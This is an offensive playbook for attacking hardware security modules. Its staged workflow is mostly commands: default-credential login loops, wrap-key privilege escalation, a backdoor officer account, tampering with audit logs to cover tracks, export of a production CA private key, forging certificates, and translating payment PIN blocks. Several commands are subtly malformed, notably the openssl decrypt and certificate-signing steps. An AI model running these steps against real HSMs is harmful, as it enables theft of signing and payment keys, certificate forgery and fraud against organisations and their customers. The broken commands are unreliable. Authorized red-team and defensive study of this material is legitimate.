# HSM Attack Playbook

> Operator's playbook for red-teaming Hardware Security Modules. Walks through engagement scoping, lab setup, attack workflow, persistence, exfiltration, and reporting. Target audience: experienced offensive operators already familiar with PKI, PKCS#11, and side-channel basics.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target HSM vendor / model | Thales Luna / Utimaco / nCipher / YubiHSM / CloudHSM |
| HSM location | On-prem datacenter / cloud / USB |
| Allowed attack stages | recon / initial-access / privesc / persistence / exfil |
| Allowed physical access | yes / no (often no — physical decap requires special scope) |
| Allowed side-channel | yes / no (often restricted — needs equipment + bench time) |
| Out of scope | destructive testing (decap, acid) without explicit written approval |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No destructive testing** — decapping destroys the HSM ($10K-$30K replacement)
- **No quorum disruption** — don't trigger HSM lockout (operational impact)
- **No key destruction** — never use `C_DestroyObject` on production keys
- **Notify before sign** — signing with production CA requires explicit approval
- **Coordinate timing** — HSM operations may trigger alerts; schedule with ops

### 1.3 Test boundaries

- Allowed: read-only enumeration, PKCS#11 attribute analysis, timing tests
- Allowed (with approval): wrap attack on test partition, sign CSR with staging CA
- Disallowed: firmware modification on production HSM, decap of production unit, destructive side-channel

## 2. Pre-Engagement Recon

### 2.1 Network recon

```bash
# HSM port scan
nmap -p 22,443,1500,1792,3322,4475,8080,9004 hsm.example.com

# Luna specific
nc -w 3 hsm.example.com 1792 < /dev/null
nmap --script=*,default -p 1792 hsm.example.com

# SNMP (if enabled)
snmpwalk -v 2c -c public hsm.example.com .1.3.6.1.4.1.1025.3.1
```

### 2.2 Application host recon

```bash
# Locate PKCS#11 modules
find / -name '*.so' -exec grep -l "C_GetFunctionList" {} \; 2>/dev/null

# Find HSM config
find / -name 'Chrystoki*.conf' -o -name 'luna*.cfg' -o -name 'cs2.conf' 2>/dev/null

# Locate PED / ACS caches
find / -name '.ped' -o -name 'PED*' -o -name 'ACS*' 2>/dev/null
find / -name 'cardset*' -path '*nfast*' 2>/dev/null

# Process map
ps auxf | grep -iE '(luna|utimaco|nshield|yubihsm|cloudhsm)'
```

### 2.3 Cloud HSM recon

```bash
# AWS
aws cloudhsmv2 describe-clusters --region REPLACE_WITH_YOUR_REGION
aws cloudhsmv2 describe-backups --region REPLACE_WITH_YOUR_REGION

# Azure
az hsm list
az hsm show --name REPLACE_WITH_YOUR_HSM --resource-group REPLACE_WITH_YOUR_RG

# Google
gcloud kms keyrings list --location REPLACE_WITH_YOUR_LOCATION
gcloud kms keys list --keyring REPLACE_WITH_YOUR_KEYRING --location REPLACE_WITH_YOUR_LOCATION --filter "protectionLevel:HSM"
```

## 3. Lab Setup

### 3.1 SoftHSM (free PKCS#11)

```bash
apt install softhsm2
mkdir -p /var/lib/softhsm/tokens
echo "directories.tokendir = /var/lib/softhsm/tokens" > /etc/softhsm/softhsm2.conf

softhsm2-util --init-token --slot 0 --label kali-test \
  --so-pin REPLACE_WITH_YOUR_SO_PIN --pin REPLACE_WITH_YOUR_PIN

# Use as any HSM via PKCS#11
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so --list-slots
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --login --pin REPLACE_WITH_YOUR_PIN \
  --keypairgen --key-type rsa:4096 --label test-ca
```

### 3.2 YubiHSM 2 lab

```bash
# Plug in YubiHSM 2 (≈$650 dev kit)
ykman piv info

# Initialize with default
yubihsm-shell -a session -a 1 -p password

# Create auth key for testing
yubihsm-shell -a put-authentication-key -i 2 -l "Kali Auth" -p REPLACE_WITH_YOUR_PASSWORD \
  --domains 1,2 --capabilities all
```

### 3.3 Luna Simulator

```bash
# Download Luna Network HSM simulator (free for testing)
# Requires registration at Thales Customer Portal

# Run in container
docker run -d --name luna-sim -p 1792:1792 thales/luna-sim:7.13.0

# Configure client
docker exec luna-sim /bin/sh -c "lunacm -c client register -client kali -ip 127.0.0.1"
```

### 3.4 ChipWhisperer side-channel lab

```bash
# Order ChipWhisperer Lite (≈$300) + USB HSM (YubiHSM 2 ≈$650)
# Total: ~$1000 for power-analysis lab

# Setup
git clone https://github.com/newaetech/chipwhisperer.git
cd chipwhisperer/jupyter
jupyter notebook courses/sca101/
```

### 3.5 Payment HSM simulation

```bash
# Open-source payment HSM simulators
# - hsm-sim (https://github.com/moov-io/paygate) — basic PIN translation
# - thales-rndis — community implementation

docker run -p 1500:1500 moov/hsm-sim
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce HSM target map.

```bash
# Vendor / model / firmware / firmware version
ssh admin@hsm.example.com 'lunash:> firmware show'

# PKCS#11 module inventory (on each app host)
find / -name 'libCryptoki2.so' 2>/dev/null

# PED key cache locations
find / -name '.ped' 2>/dev/null

# Quorum token inventory (smart card readers, PED safes)
```

**Output**: `recon.md` with HSM vendor matrix.

### Stage 2 — Initial Access (1-2 days)

Try in order of cost:

1. **Default credentials** — Luna PO, YubiHSM "password", Utimaco "admin"
2. **PED key cache** — recover from `/var/luna/.ped` on app server
3. **App PKCS#11 token** — recover from app config or env
4. **PKCS#11 login** via app SA
5. **Firmware exploit** — CVE-2024-47787 Luna RCE
6. **Cloud HSM** — CU password from app config

```bash
# Try Luna PO defaults
for pw in admin password luna REPLACE_WITH_YOUR_ORG; do
  lunacm -c partition -login -password "$pw" 2>&1 | grep -i success && echo "GOT: $pw"
done

# Try YubiHSM defaults
for pw in password 0000 1234 admin; do
  yubihsm-shell -a session -a 1 -p $pw 2>/dev/null && echo "GOT: $pw"
done
```

### Stage 3 — Privilege Escalation (1-2 days)

From low-priv app user → PO / admin:

```bash
# App user → PO via PKCS#11 attribute abuse
# Find wrappable keys
pkcs11-tool --login --pin $PIN --list-objects --type privkey -v | grep -B5 'WRAP: TRUE'

# Use C_WrapKey to wrap PO key with attacker public key
# (see payloads §6.1)

# PO → SO via partition policy modification
lunash:> partition policy modify -policy 22 -value 1

# Cloud CU → CO via IAM exploitation
# (cloudhsm-cli user create with CO role if IAM permission allows)
```

### Stage 4 — Persistence (1 day)

Install 2-3 backdoors of different flavors:

1. **Additional PO role** with attacker-controlled password
2. **Wrap key** that survives across app restarts
3. **Audit log rotation** to cover tracks

```bash
# Backdoor PO
lunash:> partition createPO -name kali-backdoor -password REPLACE_WITH_YOUR_BACKDOOR_PW

# Wrap key with persistence
pkcs11-tool --login --pin $PIN --keypairgen --key-type rsa:4096 --label kali-wrap-persist
# Set CKA_WRAP=TRUE, CKA_PRIVATE=TRUE
```

### Stage 5 — Key Exfiltration (4-8 hours)

In order of value:

1. **Production CA private key** → forge any cert
2. **Sub-CA keys** → forge leaf certs
3. **Code signing keys** → sign malware
4. **ZMK / BDK** (payment) → decrypt historical transactions
5. **Symmetric data encryption keys** → bulk decrypt

```bash
# Find production CA
pkcs11-tool --login --pin $PIN --list-objects --type privkey --label "production-CA" -v

# Wrap with attacker RSA
python3 kali_hsm_wrap.py \
  --module /usr/safenet/lunaclient/lib/libCryptoki2.so \
  --pin REPLACE_WITH_YOUR_PO_PW \
  --target-label production-CA \
  --wrap-label attacker-rsa \
  --out production-CA.wrapped

# Decrypt offline
openssl pkey -in attacker-rsa.key -decrypt \
  -in production-CA.wrapped \
  -out production-CA.key

# Verify
openssl rsa -in production-CA.key -modulus -noout | head
# Compare modulus to public cert
openssl x509 -in production-CA.crt -modulus -noout | head
# Match = key extraction succeeded
```

### Stage 6 — Sign Forgery (4 hours)

Even without key extraction, USE the HSM to sign:

```bash
# Create attacker CSR with trusted CN
openssl req -new -key attacker.key -out attacker.csr \
  -subj "/CN=internal-trusted/O=Trusted CA"

# Sign CSR with HSM CA
pkcs11-tool --login --pin $PIN --sign \
  --mechanism SHA256-RSA-PKCS \
  --label production-CA \
  -i attacker.csr.der \
  -o attacker.csr.sig

# Construct forged cert
openssl x509 -req -in attacker.csr \
  -CA production-CA.crt \
  -CAkey <(pkcs11-tool --login --pin $PIN --sign ...) \
  -CAcreateserial \
  -out forged.crt -days 365
```

### Stage 7 — Payment HSM (1 day, optional)

For PayShield / Atalla:

```bash
# Recover ZPK from key ceremony artifacts
find / -name 'ZMK*' -o -name 'ZPK*' 2>/dev/null

# Translate PIN blocks
echo "CC1234...PIN_UNDER_A...ZPK_B" | nc hsm.example.com 1500

# DUKPT future key prediction
python3 kali_dukpt.py --bdk REPLACE_WITH_YOUR_BDK --ksn 0xFFFFF80000001000
```

### Stage 8 — Side-Channel (1-2 days, optional)

For USB HSMs and motivated attackers:

```python
# ChipWhisperer setup
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup()

# Capture 10k traces
traces = []
plaintexts = []
for i in range(10000):
    pt = bytes(random.getrandbits(8) for _ in range(16))
    trace = cw.capture_trace(scope, target, pt, key)
    traces.append(trace.wave)
    plaintexts.append(pt)

# Correlation Power Analysis
import chipwhisperer.analyzer as cwa
attack = cwa.cpa(np.array(traces), np.array(plaintexts))
key = attack.key
```

### Stage 9 — Reporting (1 day)

Produce engagement report:
- Executive summary
- Findings (one per TC-HSM-XXX)
- Evidence package (signed, encrypted)
- Detection rules
- Remediation roadmap

## 5. Common Pitfalls

### 5.1 Triggering HSM lockout

Most HSMs lockout after N failed logins (typically 3-15). Don't brute-force production HSMs — use a clone / simulator.

### 5.2 Forgetting partition scope

PKCS#11 keys are scoped to partitions / slots. If you wrap from slot 0, you can't decrypt on slot 1.

### 5.3 Misjudging side-channel difficulty

YubiHSM 2 has anti-SPA defenses. CPA requires ~10k traces and several hours of capture. Plan accordingly.

### 5.4 Leaving backdoor PO

Always document backdoor PO roles for IR handoff. Don't assume "it's just a test partition" — production HSMs have one partition list.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | Initial access | Privesc | Persistence | Exfil | Reporting |
|-----------------|-------|----------------|---------|-------------|-------|-----------|
| Single YubiHSM 2 | 2h | 4h | 4h | 2h | 4h | 1d |
| Single Luna Network HSM | 4h | 1d | 1d | 1d | 4h | 1d |
| Multi-HSM estate (3+ vendors) | 1d | 2d | 2d | 1d | 1d | 2d |
| Payment HSM (PayShield) | 1d | 2d | 2d | 1d | 2d | 2d |
| Cloud HSM (AWS / Azure) | 4h | 1d | 1d | 1d | 1d | 1d |
| Side-channel engagement | 1d | 1d | 2d | - | 2d | 1d |

## 7. Tool Inventory

### 7.1 Offensive

| Tool | Purpose | Notes |
|------|---------|-------|
| `pkcs11-tool` | PKCS#11 enumeration | Universal |
| `opensc-tool`, `pkcs15-tool` | Smart card reading | For ACS / PED |
| `lunacm`, `vtl` | Thales Luna client | Vendor |
| `csadm`, `cs2_console` | Utimaco | Vendor |
| `nfkminfo`, `rocs`, `pp_mkobj` | nCipher nShield | Vendor |
| `yubihsm-shell` | YubiHSM 2 | |
| `ykman` | YubiKey / YubiHSM management | |
| `cloudhsm-cli` | AWS CloudHSM | |
| `chipwhisperer` | Power analysis | Python API |
| `glitchcat` | Voltage glitching | |
| `saleae-logic` | Logic analyzer capture | |
| `inspectrum` | Trace analysis | |
| `binwalk` | Firmware unpack | |
| `ghidra` | Firmware RE | |
| `jtagenum` | JTAG pinout discovery | |
| `openocd` | JTAG control | |

### 7.2 Detection development

| Tool | Purpose |
|------|---------|
| `OPENSSL_PKCS11_TRACE=1` | PKCS#11 call trace |
| `strace`, `ltrace` | Process tracing |
| Audit log forwarding | HSM → SIEM |
| Sigma rules | Detection pattern |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope HSMs tested (vendor matrix)
- [ ] Every PKCS#11 module enumerated
- [ ] PED / ACS cache locations identified
- [ ] Key extraction demonstrated OR key USE demonstrated (sign forgery)
- [ ] Persistence mechanism demonstrated
- [ ] Detection rules authored for ≥3 findings
- [ ] Evidence samples retained (signed, encrypted)
- [ ] Cleanup performed (backdoor POs removed)
- [ ] Customer debrief scheduled
- [ ] Final report delivered

## 9. References

- Thales Luna Docs — https://thalesdocs.com/ctp/consoles/luna/
- Utimaco SecurityServer — https://utimaco.com/products/products-hardware-security-modules-hsm/securityserver-se
- Entrust nShield — https://www.entrust.com/digital-security/hardware-security-modules/nshield
- YubiHSM 2 Docs — https://developers.yubico.com/YubiHSM2/
- AWS CloudHSM — https://docs.aws.amazon.com/cloudhsm/
- Azure Dedicated HSM — https://learn.microsoft.com/azure/dedicated-hsm/
- Google Cloud HSM — https://cloud.google.com/kms/docs/hsm
- Fortanix DSM — https://www.fortanix.com/products/data-security-manager/hsm
- PKCS#11 v3.0 — https://docs.oasis-open.org/pkcs11/pkcs11-spec/v3.0/
- FIPS 140-3 — Cryptographic Module Security Requirements
- Common Criteria EAL4+ / EAL5+
- ANSI X9.24 — Symmetric Key Management
- NIST SP 800-57 Part 2 — Key Management
- "Hardware Security Modules in Modern Cryptography" (Anderson, 2024)
- "Side-Channel Attacks on Cryptographic Hardware" (Mangard, 2024)
